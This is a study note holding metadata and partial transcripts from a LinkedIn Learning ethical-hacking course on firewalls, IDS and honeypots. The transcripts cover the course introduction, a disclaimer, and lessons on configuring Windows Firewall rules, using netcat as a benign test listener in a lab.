---
type: course
cssclasses:
  - lle-course
  - lle-level-intermediate
slug: ethical-hacking-evading-ids-firewalls-and-honeypots
url: "https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots"
duration_minutes: 140
duration: 2h 20m
level: Intermediate
updated: 5/15/2023
learners: 54600
skills:
  - Ethical Hacking
exercise_files: true
thumbnail: "https://media.licdn.com/dms/image/v2/C4E0DAQF3nBFOXnu5Fg/learning-public-crop_675_1200/learning-public-crop_675_1200/0/1567198584970?e=2147483647&amp;v=beta&amp;t=7zLSOiZTTJ-a-zsDyi8aHdQ1z3e3J3a1HsKpnqp2-9E"
linkedin_topic: Cybersecurity
learning_paths:
  - Become an Ethical Hacker
path_count: 1
tags:
  - course
  - topic/security
  - topic/network-and-system-administration
  - skill/ethical-hacking
status: not-started
created: 2026-04-19
---

![Ethical Hacking: Evading IDS, Firewalls, and Honeypots](https://media.licdn.com/dms/image/v2/C4E0DAQF3nBFOXnu5Fg/learning-public-crop_675_1200/learning-public-crop_675_1200/0/1567198584970?e=2147483647&amp;v=beta&amp;t=7zLSOiZTTJ-a-zsDyi8aHdQ1z3e3J3a1HsKpnqp2-9E)

# Ethical Hacking: Evading IDS, Firewalls, and Honeypots

> Ethical hacking—testing to see if an organization's network is vulnerable to outside attacks—is a desired skill for many IT security professionals. In this course, cybersecurity expert Malcolm Shore prepares you to take your first steps into testing client defenses. Malcolm provides you with an overview of firewall technology, detailing how firewalls work in both Windows and Linux, as well as how 

> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots) | 2h 20m | Intermediate | 55K learners
> [Jump to Path Context ↓](#path-context)

## Instructor

- [[Malcolm Shore]]

## Resources

- Exercise files available

## Skills Covered

- Ethical Hacking

## Table of Contents

### Introduction

#### Finding weaknesses in the perimeter
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/finding-weaknesses-in-the-perimeter?u=76281980)

> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/finding-weaknesses-in-the-perimeter?u=76281980&t=1)** - [Malcom] While many cyber attacks may start with social engineering, the actual breach occurs after the malware or an intruder has got inside the perimeter.
>
> **[0:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/finding-weaknesses-in-the-perimeter?u=76281980&t=10)** Consequently, businesses place a lot of emphasis on using firewalls, intrusion detection systems, and sometimes Honeypots to protect the perimeter.
>
> **[0:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/finding-weaknesses-in-the-perimeter?u=76281980&t=20)** In this course, I'll cover the major perimeter protection devices.
>
> **[0:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/finding-weaknesses-in-the-perimeter?u=76281980&t=23)** I'll start by explaining and demonstrating the basics of firewall technology.
>
> **[0:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/finding-weaknesses-in-the-perimeter?u=76281980&t=29)** We'll take a look at web application firewalls and API gateway threat mitigation solutions, and we'll learn about the carrier Honeypot and how operational security teams use security onion for intrusion detection and alerting.
>
> **[0:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/finding-weaknesses-in-the-perimeter?u=76281980&t=43)** We'll then take a look at the evasion techniques used by malware and intruders, and we'll demonstrate some evasive attacks.
>
> **[0:51](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/finding-weaknesses-in-the-perimeter?u=76281980&t=51)** I'm Malcolm Shore, and I spent a career developing and running security programs for governments and businesses.
>
> **[0:59](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/finding-weaknesses-in-the-perimeter?u=76281980&t=59)** I'd like to invite you to take this course and learn about perimeter defenses and how our adversaries evade them.

> [!info]- Semantic Content
>
> **Env Vars:** api (1)
> **Speakers:** - [malcom] (1)

#### What you should know
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/what-you-should-know?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/what-you-should-know?u=76281980&t=0)** - [Instructor] This is a practical course.
>
> **[0:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/what-you-should-know?u=76281980&t=2)** And during this course, I'll be setting up and using tools to interact with perimeter devices, such as firewalls and IDS.
>
> **[0:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/what-you-should-know?u=76281980&t=10)** I'll be using the VirtualBox environment, and you should be familiar with using Kali Linux and its terminal shell, and the Windows command shell.
>
> **[0:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/what-you-should-know?u=76281980&t=19)** We'll also be working at the IPv4 network level and you'll want to be familiar with networking concepts, particularly around addressing import management and basic networking tools such as netcat and Nmap.
>
> **[0:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/what-you-should-know?u=76281980&t=33)** We'll also be touching on the Cisco IOS operating system and we'll use a number of tools for perimeter defense testing but you'll learn about those during the course.

> [!info]- Semantic Content
>
> **Env Vars:** ids (1), ios (1)
> **Analogies:** such as (2)
> **Tools:** terminal (1)
> **Definitions:** is a  (1)
> **Speakers:** - [instructor] (1)

#### Course disclaimer
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/course-disclaimer?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/course-disclaimer?u=76281980&t=0)** - [Instructor] This is one of a series of ethical hacking courses, and it uses a range of third-party testing tools.
>
> **[0:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/course-disclaimer?u=76281980&t=6)** Some are commercial products, and some are open-source.
>
> **[0:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/course-disclaimer?u=76281980&t=10)** The download and installation instructions for all tools used in this course are available as a PDF in the associated course material.
>
> **[0:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/course-disclaimer?u=76281980&t=18)** While we've done our best to ensure that the tools we use, and the sites we reference are legitimate, testing sites can be targets for hackers.
>
> **[0:26](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/course-disclaimer?u=76281980&t=26)** And we can't provide any assurance that these sites might not have been compromised by the time you visit them.
>
> **[0:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/course-disclaimer?u=76281980&t=32)** Some of the sites which store the testing tools are detected as dangerous, because the tools have similar signatures to malware, and may raise anti-virus alerts when you visit them.
>
> **[0:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/course-disclaimer?u=76281980&t=42)** The testing tools we demonstrate are extremely powerful.
>
> **[0:46](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/course-disclaimer?u=76281980&t=46)** They may demonstrate some of the same signature characteristics as malware, and malicious implants.
>
> **[0:51](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/course-disclaimer?u=76281980&t=51)** And may raise anti-virus alerts when you try to download them.
>
> **[0:55](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/course-disclaimer?u=76281980&t=55)** Again, we can't provide assurance that the software hasn't been compromised when you download it.
>
> **[1:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/course-disclaimer?u=76281980&t=60)** As so, as for any other software from the internet, you need to exercise due diligence and take personal responsibility for anything you load into your system.

> [!info]- Semantic Content
>
> **Code Keywords:** raise (2)
> **Env Vars:** pdf (1)
> **Speakers:** - [instructor] (1)


### 1. Firewalls

#### Understanding Firewalls
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understanding-firewalls?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understanding-firewalls?u=76281980&t=0)** - [Instructor] While many of today's breaches result from malware being delivered through web browsing and email accounts, direct penetration through hacking is still a significant issue.
>
> **[0:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understanding-firewalls?u=76281980&t=10)** A key control to prevent this is the use of perimeter firewalls.
>
> **[0:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understanding-firewalls?u=76281980&t=14)** These come in two forms: personal firewalls and endpoint devices and enterprise firewalls to protect business enclaves.
>
> **[0:22](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understanding-firewalls?u=76281980&t=22)** These operate in essentially the same way.
>
> **[0:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understanding-firewalls?u=76281980&t=25)** A firewall in its simplest form is designed to mediate access between two computers in different zones.
>
> **[0:31](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understanding-firewalls?u=76281980&t=31)** Typical examples being an internal user browsing the internet and a connection from the internet into an internal business server.
>
> **[0:39](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understanding-firewalls?u=76281980&t=39)** To do this, the firewall has a set of rules which instructs it to either allow or deny the connection based on various criteria, such as source and destination addresses, source and destination ports, and so on.
>
> **[0:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understanding-firewalls?u=76281980&t=52)** Firewalls can be built into operating systems or can be standalone devices.
>
> **[0:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understanding-firewalls?u=76281980&t=57)** Let's start by looking at the firewalls built into Windows and Linux.

> [!info]- Semantic Content
>
> **Code Keywords:** this, (1), let (1)
> **Analogies:** such as (1)
> **Speakers:** - [instructor] (1)

#### Apply the basics of the Windows firewall
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980)

> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=1)** - [Instructor] To find the Windows Firewall, I'll click on the Windows button, Settings, Updates and Security, and Windows Security and I'll open Windows Security.
>
> **[0:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=17)** This might be called the Windows Defender Security Center on your system.
>
> **[0:22](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=22)** I'll select Firewall and Network protection.
>
> **[0:26](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=26)** This shows three networks profiles: Domain network, Private network, and Public network.
>
> **[0:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=34)** When we set up a new network on the computer, Windows will ask what type of network connection we want and configure the network settings accordingly.
>
> **[0:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=45)** We can see the firewall is on and that we're connected as a private network.
>
> **[0:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=50)** We're not connected to any public network, but I'll open the Public network and we can see the Public network settings.
>
> **[1:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=61)** There's a radio button captioned Windows Defender Firewall and we can see it's on.
>
> **[1:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=68)** When I click on that, the firewall is switched off and we're told that our system may be vulnerable.
>
> **[1:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=77)** I'll switch it on again.
>
> **[1:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=78)** When I'm connected to a public network, I don't want to allow any internet system to directly connect into my computer, so all incoming connections from the internet have been blocked to increase the security when we're not on our private network.
>
> **[1:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=94)** Okay, I'll go back to the main screen.
>
> **[1:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=98)** I'll now select the link, Allow an app through firewall from the list at the bottom of the screen.
>
> **[1:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=107)** This link displays a list of programs which are allowed to communicate into the network zone for both the private and the public network.
>
> **[1:56](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=116)** If we scroll down, we can see File and Printer Sharing is allowed when we're on our private network, but not when we're connected to a public network.
>
> **[2:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=127)** This is good.
>
> **[2:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=128)** If we highlight it and then click on Details, we can see that this service uses the SMB and RPC protocols, both of which have been exploited heavily and we don't want to be exposed to these when we're directly on the internet.
>
> **[2:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=144)** We can include another program in the list by clicking Change settings and Allow another app.
>
> **[2:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=152)** This allows us to browse and select an app to load.
>
> **[2:37](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=157)** I'll browse to my Tools/mmap directory and select mmap.exe.
>
> **[2:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=165)** If I press Network types, we can see that the Microsoft firewall defaults new programs to the private network only.
>
> **[2:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=173)** That's fine, so let's now press OK, and then Add.
>
> **[2:58](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=178)** And we can see our selected program has been added.
>
> **[3:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=182)** We can press OK now and close this screen.
>
> **[3:04](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=184)** So Windows Firewall allows us to control which programs can accept connections from another computer when we're on our home network and which connections are accepted when we go out with our laptop and connect to a public network.
>
> **[3:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=197)** Most computers come with a network communications tool called netcat, which we can use to communicate between two computers, one being a sender and the other a listener.
>
> **[3:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=208)** I'll use this program to demonstrate the features of the Windows Firewall by communicating to this computer remotely.
>
> **[3:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=220)** I've got a command prompt for this computer set up in my tools folder and I can find its IP address by entering ipconfig.
>
> **[3:51](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=231)** Okay, we can see it's 192.168.1.101.
>
> **[3:58](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=238)** Let's start up a listener on port 4545 by typing nc minus lp 4545.
>
> **[4:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=248)** The L option configures netcat to listen and P with a number specifies which port to listen on.
>
> **[4:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=255)** Immediately, the Windows Firewall has blocked access and is asking whether we want to allow connections to netcat on the private network.
>
> **[4:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=264)** I'll click on Allow access.
>
> **[4:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=269)** From Karli, I can now connect to this listener and send a message.
>
> **[4:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=283)** We can see a connection has been made, the message sent from Karli, and then it's received and displayed by the listener.
>
> **[4:51](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=291)** I'll bring up the Windows Firewall and select Allow an app through firewall again.
>
> **[4:58](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=298)** And if we scroll down, we can see that netcat is now an allowed program.
>
> **[5:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=308)** So, we've protected our computer while retaining the ability to allow new connects as and when required.

> [!info]- Semantic Content
>
> **Code Keywords:** public (8), private (7), let (2), switch (1), protected (1)
> **UI Navigation:** click on (4), scroll down (2), open the (1), select the (1)
> **Prerequisites:** set up (2), configure (1)
> **CLI Commands:** find (2)
> **Env Vars:** smb (1), rpc (1)
> **Ports:** port 4545 (1)
> **Versions:** 192.168.1 (1)
> **Cross-References:** go back to (1)

#### Use advanced features in the Windows Firewall
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980)

> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=1)** - [Instructor] Now that we've looked at the basic operation of Windows Firewall, let's take a look at the advanced settings.
>
> **[0:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=8)** At the Firewall and Network Protection screen, I can see I'm on a public network.
>
> **[0:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=15)** I'll select advanced settings.
>
> **[0:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=20)** This brings me to the Windows Defender Firewall with Advanced Security screen.
>
> **[0:26](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=26)** This is intended for system administrators in an enterprise network.
>
> **[0:31](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=31)** We can see that at the middle panel, we have profiles for domain, private and public zones, as we did in the basic firewall.
>
> **[0:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=40)** The various functions in this screen can be accessed through the rule items on the left, the properties links in the middle panel or from the actions links on the right.
>
> **[0:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=50)** Advanced security allows us to apply specific restrictions to connections and also provides three additional features which are useful in an enterprise configuration, ensuring computers authenticate to each other before they connect, that data integrity is checked on all communications received and that data is encrypted during transmission.
>
> **[1:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=74)** We've already looked at connections which are allowed or blocked, but Windows Firewall can also configure a connection to be allowed only if it's secured by using the IP Set Protocol.
>
> **[1:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=85)** If we click the Windows Defender Firewall properties link at the bottom of the top panel, a dialog pops up.
>
> **[1:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=93)** This has a tab for each of the three zones and a tab for IP Sec.
>
> **[1:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=98)** Let's select the public profile.
>
> **[1:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=102)** We can see that this tab sheet has three panels, state, settings and logging.
>
> **[1:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=107)** The state panel provides the basic connection management settings that we've already covered.
>
> **[1:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=113)** I'll click on the customize button in the settings panel, to change how the firewall responds to certain events.
>
> **[2:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=122)** The first is a simple yes or no as to whether Windows Firewall should tell me that it's blocking a connection.
>
> **[2:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=130)** I'll select no for this and then press okay to close the window.
>
> **[2:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=137)** I removed netcat from the list of approved apps.
>
> **[2:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=140)** I'll check my IP address and set up the netcat listener at the Windows command prompt.
>
> **[2:31](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=151)** At the Kali terminal, I'll set up the sender in the remote console and send a message.
>
> **[2:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=162)** Back at Windows, nothing is received which tells me that the firewall is blocking the connection.
>
> **[2:48](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=168)** Okay, I'll go back to the advanced settings and switch notifications back on.
>
> **[3:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=180)** Now when I start up netcat, Windows asks me whether I want to allow it to accept connections.
>
> **[3:09](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=189)** I do.
>
> **[3:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=193)** At the Kali terminal, I'll start up the sender and send a message.
>
> **[3:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=203)** And this time, we get the message in Windows.
>
> **[3:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=208)** The next panel determines whether a unicast response is allowed to a multicast message.
>
> **[3:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=214)** Unicast is simply a transmission to one address and multicast a transmission to many.
>
> **[3:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=220)** Normally, we'd get a multicast response to a multicast request.
>
> **[3:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=225)** Unicast responses are sometimes used by hackers to respond to a multicast event and while the default is to allow unicast responses, we're safer from a defensive perspective to switch it off.
>
> **[4:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=241)** The bottom panel in this window relates to merging rules and we're not covering that feature in this course.
>
> **[4:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=248)** I'll press okay and close this dialog box.
>
> **[4:11](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=251)** The customize button on the logging panel allows us to set what logging is maintained and where the logging files are stored.
>
> **[4:21](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=261)** By clicking it, we can see the location and the maximum size of the log file.
>
> **[4:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=267)** Windows Firewall doesn't save timestamp versions of log files so the log file size has to be sufficient to collect enough logging for our monitoring purposes.
>
> **[4:37](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=277)** We can also see that logging can be enabled on either allowed connections or denied connections or both and I'll set both.
>
> **[4:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=293)** I'll click okay to close the logging window and okay again to close the properties window.
>
> **[5:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=300)** Now, let's look at how to set up detailed inbound and outbound rules.
>
> **[5:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=307)** When I click on inbound rules, the detailed list of rules is displayed.
>
> **[5:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=312)** There are a lot of settings which can be customized and as an example, I'll use netcat to demonstrate how we can block a protocol and restrict a connection by IP address.
>
> **[5:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=329)** When we enabled netcat as an app, two rules were added.
>
> **[5:35](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=335)** Let's get the firewall to restrict access to netcat to just Kali, which is on IP address 10.0.1.2.24.
>
> **[5:44](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=344)** The right hand panel at the top shows which set of rules are currently displayed and at the bottom, the specific rule.
>
> **[5:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=350)** Okay, let's set the restriction.
>
> **[5:55](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=355)** I'll select just the first netcat rule which, if I scroll along, we can see is for UDP and click on the properties control and select the scope tab.
>
> **[6:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=368)** I'll click on remote IP addresses and click add and enter 10.0.2.24.
>
> **[6:22](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=382)** And now I'll apply the change.
>
> **[6:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=385)** Windows Firewall tells me that an error has occurred with the defer to user setting but that's expected.
>
> **[6:31](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=391)** I'll click okay and switch to the advanced tab.
>
